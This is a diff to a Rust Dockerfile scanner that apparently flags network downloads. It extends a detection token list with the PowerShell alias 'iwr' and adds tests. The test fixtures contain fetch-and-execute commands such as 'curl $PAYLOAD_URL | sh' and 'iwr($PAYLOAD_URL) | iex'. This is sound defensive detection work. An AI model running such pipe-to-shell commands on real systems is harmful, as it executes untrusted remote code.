@@ -20,8 +20,15 @@ use super::image_uses_mutable_latest;
 /// word-boundary awareness: a token matches when followed by whitespace,
 /// a shell operator (`|`, `;`, `&`, `>`), or end-of-line. This catches
 /// pipe-joined commands like `curl|sh` that lack trailing whitespace.
-const DOCKERFILE_NETWORK_DOWNLOAD_TOKENS: &[&str] =
-    &["curl", "wget", "invoke-webrequest", "ncat", " nc", "fetch"];
+const DOCKERFILE_NETWORK_DOWNLOAD_TOKENS: &[&str] = &[
+    "curl",
+    "wget",
+    "invoke-webrequest",
+    "iwr",
+    "ncat",
+    " nc",
+    "fetch",
+];
 
 pub(crate) fn analyze_dockerfile(path: &Path, content: &str) -> Vec<Finding> {
     let artifact_path = path.display().to_string();
@@ -248,6 +255,7 @@ fn token_with_boundary(lower_line: &str, token: &str) -> bool {
         let right_ok = after.is_empty()
             || after.starts_with(' ')
             || after.starts_with('\t')
+            || after.starts_with('(')
             || after.starts_with('|')
             || after.starts_with(';')
             || after.starts_with('&')
@@ -468,6 +476,7 @@ mod tests {
         for content in [
             "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
             "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"iwr($PAYLOAD_URL) | iex\"\n",
         ] {
             let caps = dockerfile_capabilities(content);
             assert!(
@@ -569,6 +578,23 @@ mod tests {
         );
     }
 
+    /// # Contract (negative)
+    ///
+    /// PowerShell download aliases must still require a real command token.
+    #[test]
+    fn dockerfile_capabilities_rejects_iwr_substrings() {
+        let content = "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n";
+        let caps = dockerfile_capabilities(content);
+        let has_observed_network = caps.iter().any(|fact| {
+            fact.capability == ArtifactCapability::NetworkAccess
+                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
+        });
+        assert!(
+            !has_observed_network,
+            "iwr substrings must not trip observed NetworkAccess; got {caps:?}",
+        );
+    }
+
     /// Contract: `dockerfile_relations` must record a `Downloads` edge for
     /// EVERY token in `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS`, paralleling
     /// `dockerfile_capabilities`. Pre-fix only `curl `/`wget ` produced an
@@ -641,6 +667,7 @@ mod tests {
         for content in [
             "FROM alpine\nRUN /usr/bin/curl\t$PAYLOAD_URL | sh\n",
             "FROM node:22\nRUN node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+            "FROM mcr.microsoft.com/powershell\nRUN pwsh -Command \"iwr($PAYLOAD_URL) | iex\"\n",
         ] {
             let links = dockerfile_relations(content);
             assert!(
@@ -650,6 +677,21 @@ mod tests {
                 "{content:?} must produce a Downloads edge; got {links:?}",
             );
         }
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Lookalike PowerShell aliases do not produce download edges.
+    #[test]
+    fn dockerfile_relations_rejects_iwr_substrings() {
+        let content = "FROM alpine\nRUN echo kiwr($PAYLOAD_URL)\n";
+        let links = dockerfile_relations(content);
+        assert!(
+            !links
+                .iter()
+                .any(|link| matches!(link.relation, ArtifactRelation::Downloads)),
+            "iwr substrings must not produce Downloads edges; got {links:?}",
+        );
     }
 
     /// Contract: `ADD <url> <dest>` must record the same Downloads edge as
